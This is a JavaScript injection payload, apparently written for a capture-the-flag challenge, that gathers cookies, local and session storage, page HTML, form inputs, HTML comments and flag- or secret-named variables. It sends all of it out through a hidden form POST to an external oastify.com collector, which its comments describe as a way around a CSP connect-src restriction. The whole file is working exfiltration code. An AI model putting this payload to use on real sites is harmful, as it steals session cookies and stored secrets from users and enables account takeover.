// Flag extraction payload - uses form submission to bypass CSP
(function() {
    // Collect all possible flag locations
    const flagData = {
        url: window.location.href,
        title: document.title,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        
        // Look for flag-like content in DOM
        bodyText: document.body.innerText,
        htmlContent: document.documentElement.outerHTML,
        
        // Check for flag variables
        windowVars: Object.keys(window).filter(key => 
            key.toLowerCase().includes('flag') || 
            key.toLowerCase().includes('secret') ||
            key.toLowerCase().includes('ctf')
        ).reduce((obj, key) => {
            obj[key] = window[key];
            return obj;
        }, {}),
        
        // Meta tags
        metaTags: Array.from(document.querySelectorAll('meta')).map(meta => ({
            name: meta.name || meta.property,
            content: meta.content
        })),
        
        // All input values
        inputs: Array.from(document.querySelectorAll('input')).map(input => ({
            name: input.name,
            value: input.value,
            type: input.type
        })),
        
        // Comments in HTML
        comments: (document.documentElement.outerHTML.match(/<!--[\s\S]*?-->/g) || [])
    };
    
    // Create and submit form (bypasses CSP connect-src restriction)
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://y21cd4cgrybmff6a2pkd734pmgs7g04p.oastify.com/form-exfil';
    form.style.display = 'none';
    
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'flagData';
    input.value = JSON.stringify(flagData);
    form.appendChild(input);
    
    document.body.appendChild(form);
    form.submit();
    
    // Also create visible output on the page as backup
    const output = document.createElement('div');
    output.style.cssText = `
        position: fixed; 
        top: 10px; 
        left: 10px; 
        right: 10px; 
        background: #000; 
        color: #0f0; 
        font-family: monospace; 
        font-size: 12px; 
        padding: 20px; 
        z-index: 9999; 
        max-height: 80vh; 
        overflow: auto; 
        border: 3px solid #f00;
        white-space: pre-wrap;
    `;
    
    output.textContent = '=== FLAG EXTRACTION RESULTS ===\n\n' + JSON.stringify(flagData, null, 2);
    document.body.appendChild(output);
    
    // Also log to console
    console.log('=== FLAG DATA ===', flagData);
})();